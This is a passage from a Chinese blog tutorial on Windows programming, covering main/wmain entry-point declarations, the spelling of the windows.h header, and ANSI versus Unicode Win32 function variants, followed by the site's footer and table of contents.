class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Must input two args[Start in CMD]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//szName = arg[1];//注意下面的写法</span></span><br><span class="line">        <span class="comment">//printf(&quot;%s&quot;, argv);</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;NAME:&quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client begin:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，这是一个语法错误。查阅Microsoft文档，可知 main 函数的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main 函数没有声明，因为它内置于语言中。 如果有，则 main 的声明语法如下所示：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>;</span><br><span class="line"><span class="comment">//如果 main 中未指定返回值，编译器会提供零作为返回值。</span></span><br></pre></td></tr></table></figure><p>如果将源代码设计为使用 Unicode 宽 character，则可以使用特定于 Microsoft 的 <code>wmain</code> 入口点，即宽 character 版的 <code>main</code>。 下面是 <code>wmain</code> 的有效声明语法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span> *argv[])</span></span>;</span><br></pre></td></tr></table></figure><p>还可以使用特定于 Microsoft 的 <code>_tmain</code>，它是 <em><code>tchar.h</code></em> 中定义的预处理器宏。 除非定义了 <code>_UNICODE</code>，否则 <code>_tmain</code> 解析为 <code>main</code>。 在该示例中，<code>_tmain</code> 将解析为 <code>wmain</code>。 对于需要分别生成窄版和宽版 character 集的代码来说，<code>_tmain</code> 宏和以 <code>_t</code> 开头的其他宏非常有用。 有关详细信息，请参阅<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/c-runtime-library/using-generic-text-mappings?view=msvc-170">使用一般文本映射</a>。</p><br><h3 id="11-4-windows-h头文件的首字母大写"><a href="#11-4-windows-h头文件的首字母大写" class="headerlink" title="11.4 windows.h头文件的首字母大写"></a>11.4 <code>windows.h</code>头文件的首字母大写</h3><p>在C++中有这样两个头文件就像双胞胎一样，它们分别是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>二者在功能上没有区别，且二者库中的函数都是相同的</p><p>二者在用途上有区别：</p><ul><li>控制台程序中我们常用<code>windows.h</code>，而在MFC等窗口或SDK程序中，我们常用<code>Windows.h</code></li><li>这是因为Linux系统对文件的大小写比较敏感，而Windows相对而言没有那么严格。</li></ul><br><h3 id="11-5-Win-API-中的A-W版本函数"><a href="#11-5-Win-API-中的A-W版本函数" class="headerlink" title="11.5 Win API 中的A/W版本函数"></a>11.5 Win API 中的A/W版本函数</h3><p>在 Win32 API 中，函数名后的 “A” 和 “W” 后缀代表了该函数的 ANSI 和 Unicode 版本。在早期的 Windows 系统中，ANSI 版本是使用单字节字符集（主要是 ASCII），而 Unicode 版本支持更广泛的双字节字符集，包括多种语言字符。</p><ul><li>“A” 后缀：代表 ANSI 版本。这个版本的函数使用单字节字符集，主要是 ASCII。例如，WNDCLASSA 是一个处理 ANSI 窗口类的结构。</li><li>“W” 后缀：代表 Unicode 版本。这个版本的函数使用双字节字符集，支持多种语言字符。例如，WNDCLASSW 是一个处理 Unicode 窗口类的结构。</li></ul><p>在现代的 Windows 系统中，推荐总是使用 <code>Unicode</code> 版本，因为它支持更广泛的字符集，并且在很多情况下，使用 Unicode 版本的函数不需要额外的工作。然而，如果你在处理的都是 ASCII 字符，并且出于某种原因需要节省内存或处理速度，那么可以使用 ANSI 版本。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css"></div><div class="reward-container"><div></div><button onclick='var qr=document.getElementById("qr");qr.style.display="none"===qr.style.display?"block":"none"'>打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/wechatpay.png" alt="Moustache 微信支付"><p>微信支付</p></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Moustache</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://hammerzer.github.io/2024/06/05/windows-Quick-Start/" title="Windows快速入门">https://hammerzer.github.io/2024/06/05/windows-Quick-Start/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%A1%86%E6%9E%B6/" rel="tag"><i class="fa fa-tag"></i> 操作系统与框架</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2024/05/29/Linux-Quick-Start2/" rel="prev" title="Linux快速入门-2"><i class="fa fa-chevron-left"></i> Linux快速入门-2</a></div><div class="post-nav-item"><a href="/2024/06/11/word-questions/" rel="next" title="Word常见问题">Word常见问题 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CONTENT-OUTLINE"><span class="nav-number">1.</span> <span class="nav-text">CONTENT OUTLINE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%87%E3%80%81%E7%9B%AE%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">〇、目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E5%AD%A6%E4%B9%A0windows%E7%BC%96%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">一 学习windows编程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-windows%E7%BC%96%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">3.1.</span> <span class="nav-text">1 windows编程是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%E4%B9%A0windows%E7%BC%96%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">2 为什么要学习windows编程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0windows%E7%BC%96%E7%A8%8B"><span class="nav-number">3.3.</span> <span class="nav-text">3 怎么学习windows编程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="nav-number">3.4.</span> <span class="nav-text">4 环境安装和快捷键</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="nav-number">3.4.1.</span> <span class="nav-text">4.1 环境安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-VA%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="nav-number">3.4.2.</span> <span class="nav-text">4.2 VA安装及常用快捷键</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-Windows%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">4.</span> <span class="nav-text">二 Windows编程基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%AE%8C%E5%85%A8%E6%89%8B%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAWin32%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F"><span class="nav-number">4.1.</span> <span class="nav-text">2.1 完全手写第一个Win32窗口程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-%E9%93%BE%E6%8E%A5%E9%94%99%E8%AF%AF"><span class="nav-number">4.1.1.</span> <span class="nav-text">2.1.1 链接错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-LNK1104-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6-exe"><span class="nav-number">4.1.2.</span> <span class="nav-text">2.1.2 LNK1104: 无法打开文件*.exe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-API%E4%B8%8ESDK"><span class="nav-number">4.2.</span> <span class="nav-text">2.2 API与SDK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%AA%97%E5%8F%A3%E4%B8%8E%E5%8F%A5%E6%9F%84-%E7%AA%97%E5%8F%A3%E7%B1%BB%E5%AF%B9%E8%B1%A1"><span class="nav-number">4.3.</span> <span class="nav-text">2.3 窗口与句柄&#x2F;窗口类对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF"><span class="nav-number">4.4.</span> <span class="nav-text">2.4 消息循环</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Windows%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83"><span class="nav-number">4.5.</span> <span class="nav-text">2.5 Windows数据类型和命名规范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B"><span class="nav-number">5.</span> <span class="nav-text">三 网络编程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">5.1.</span> <span class="nav-text">3.1 网络编程基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-socket%E6%A6%82%E5%BF%B5"><span class="nav-number">5.1.1.</span> <span class="nav-text">3.1.1 socket概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-%E4%BB%80%E4%B9%88%E6%98%AFC-S%E6%A8%A1%E5%BC%8F"><span class="nav-number">5.1.2.</span> <span class="nav-text">3.1.2 什么是C&#x2F;S模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-3-%E4%BB%80%E4%B9%88%E6%98%AF%E9%9D%A2%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E9%9D%A2%E5%90%91%E6%B6%88%E6%81%AF%E3%80%90TCP-UDP%E3%80%91"><span class="nav-number">5.1.3.</span> <span class="nav-text">3.1.3 什么是面向连接和面向消息【TCP&#x2F;UDP】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-4-IP%E5%9C%B0%E5%9D%80%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="nav-number">5.1.4.</span> <span class="nav-text">3.1.4 IP地址和端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%A5%97%E6%8E%A5%E5%AD%97%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%8D%8F%E8%AE%AE%E8%AE%BE%E7%BD%AE"><span class="nav-number">5.2.</span> <span class="nav-text">3.2 套接字类型与协议设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E6%9C%AC%E5%87%BD%E6%95%B0%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">5.3.</span> <span class="nav-text">3.3 网络编程基本函数和基本数据结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E5%9F%BA%E4%BA%8ETCP%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">5.4.</span> <span class="nav-text">3.4 基于TCP的服务端&#x2F;客户端</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-1-TCP%E5%A5%97%E6%8E%A5%E5%AD%97"><span class="nav-number">5.4.1.</span> <span class="nav-text">3.4.1 TCP套接字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-UDP%E5%A5%97%E6%8E%A5%E5%AD%97"><span class="nav-number">5.4.2.</span> <span class="nav-text">3.4.2 UDP套接字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-3-%E5%85%B3%E4%BA%8ETCP%E5%92%8CUDP%E7%9A%84%E6%80%BB%E7%BB%93"><span class="nav-number">5.4.3.</span> <span class="nav-text">3.4.3 关于TCP和UDP的总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6"><span class="nav-number">6.</span> <span class="nav-text">四 网络编程进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-listen%E7%9A%84%E5%85%B7%E4%BD%93%E5%90%AB%E4%B9%89"><span class="nav-number">6.1.</span> <span class="nav-text">4.1 listen的具体含义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E4%B8%80%E7%A7%8D%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84recv%E5%92%8Csend%EF%BC%9A%E8%B6%85%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BC%A0%E8%BE%93"><span class="nav-number">6.2.</span> <span class="nav-text">4.2 一种更优雅的recv和send：超大数据的传输</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98"><span class="nav-number">7.</span> <span class="nav-text">五 网络编程实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98%E4%B9%8B%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E6%88%AA%E5%8F%96"><span class="nav-number">7.1.</span> <span class="nav-text">5.1 网络编程实战之网络文件截取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-1-%E5%AE%A2%E6%88%B7%E7%AB%AFClient%E5%AE%9E%E7%8E%B0"><span class="nav-number">7.1.1.</span> <span class="nav-text">5.1.1 客户端Client实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0"><span class="nav-number">7.1.2.</span> <span class="nav-text">5.1.2 服务端实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%E4%B8%8E%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">7.2.</span> <span class="nav-text">5.2 隐藏进程与修改注册表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD-%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="nav-number">8.</span> <span class="nav-text">六 多线程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">8.1.</span> <span class="nav-text">6.1基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E7%BA%BF%E7%A8%8B%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-number">8.2.</span> <span class="nav-text">6.2 线程创建函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E7%AE%80%E5%8D%95%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A4%BA%E4%BE%8B"><span class="nav-number">8.3.</span> <span class="nav-text">6.3 简单多线程示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#6-3-1-%E7%90%86%E8%A7%A3%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1"><span class="nav-number">8.3.1.</span> <span class="nav-text">6.3.1 理解内核对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-3-2-%E4%B8%BE%E4%BE%8B"><span class="nav-number">8.3.2.</span> <span class="nav-text">6.3.2 举例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B8%8E%E4%BA%92%E6%96%A5%E5%AF%B9%E8%B1%A1"><span class="nav-number">8.4.</span> <span class="nav-text">6.4 线程同步与互斥对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-5-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E7%BE%A4%E8%81%8A"><span class="nav-number">8.5.</span> <span class="nav-text">6.5 多线程实现QQ群聊</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5"><span class="nav-number">9.</span> <span class="nav-text">七 线程同步</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B9%8B%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1"><span class="nav-number">9.1.</span> <span class="nav-text">7.1 线程同步之事件对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3windows%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%8F%A5%E6%9F%84"><span class="nav-number">9.2.</span> <span class="nav-text">7.2 深入理解windows内核对象与句柄</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-1-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1"><span class="nav-number">9.2.1.</span> <span class="nav-text">7.2.1 内核对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-2-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%A1%E6%95%B0%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="nav-number">9.2.2.</span> <span class="nav-text">7.2.2 内核对象的使用计数与生命周期</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-3-%E6%93%8D%E4%BD%9C%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1"><span class="nav-number">9.2.3.</span> <span class="nav-text">7.2.3 操作内核对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-4-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-number">9.2.4.</span> <span class="nav-text">7.2.4 内核对象与其他类型的对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2-5-%E6%B3%A8%E6%84%8F%E4%B8%8E%E8%A1%A5%E5%85%85"><span class="nav-number">9.2.5.</span> <span class="nav-text">7.2.5 注意与补充</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B9%8B%E4%BF%A1%E5%8F%B7%E9%87%8F"><span class="nav-number">9.3.</span> <span class="nav-text">7.3 线程同步之信号量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B9%8B%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E6%AE%B5"><span class="nav-number">9.4.</span> <span class="nav-text">7.4 线程同步之关键代码段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-5-%E7%BA%BF%E7%A8%8B%E6%AD%BB%E9%94%81"><span class="nav-number">9.5.</span> <span class="nav-text">7.5 线程死锁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-6-%E5%90%84%E7%A7%8D%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E7%9A%84%E6%AF%94%E8%BE%83%E6%80%BB%E7%BB%93"><span class="nav-number">9.6.</span> <span class="nav-text">7.6 各种线程同步的比较总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB-%E8%BF%9B%E7%A8%8B"><span class="nav-number">10.</span> <span class="nav-text">八 进程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%EF%BC%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="nav-number">10.1.</span> <span class="nav-text">8.1 基本概念：进程和子进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="nav-number">10.2.</span> <span class="nav-text">8.2 如何创建一个进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="nav-number">10.3.</span> <span class="nav-text">8.3 进程间通信方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E5%89%AA%E5%88%87%E6%9D%BF"><span class="nav-number">10.4.</span> <span class="nav-text">8.4 进程间通信方式之剪切板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-5-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E9%82%AE%E6%A7%BD"><span class="nav-number">10.5.</span> <span class="nav-text">8.5 进程间通信方式之邮槽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-6-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E5%8C%BF%E5%90%8D%E7%AE%A1%E9%81%93"><span class="nav-number">10.6.</span> <span class="nav-text">8.6 进程间通信方式之匿名管道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-7-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8B%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93"><span class="nav-number">10.7.</span> <span class="nav-text">8.7 进程间通信方式之命名管道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-8-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%B9%8BWM-COPYDATA"><span class="nav-number">10.8.</span> <span class="nav-text">8.8 进程间通信方式之WM_COPYDATA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-9-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E7%9A%84%E6%AF%94%E8%BE%83"><span class="nav-number">10.9.</span> <span class="nav-text">8.9 进程间通信方式的比较</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">11.</span> <span class="nav-text">九 文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-C-C-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6"><span class="nav-number">11.1.</span> <span class="nav-text">9.1 C&#x2F;C++操作文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#9-1-1-C%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6"><span class="nav-number">11.1.1.</span> <span class="nav-text">9.1.1 C语言操作文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-1-2-C-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6"><span class="nav-number">11.1.2.</span> <span class="nav-text">9.1.2 C++操作文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-1-3-Win32-API"><span class="nav-number">11.1.3.</span> <span class="nav-text">9.1.3 Win32 API</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-1-4-MFC%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6"><span class="nav-number">11.1.4.</span> <span class="nav-text">9.1.4 MFC操作文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E4%B8%8E%E8%AF%BB%E5%86%99"><span class="nav-number">11.2.</span> <span class="nav-text">9.2 配置文件的访问与读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E7%A8%8B"><span 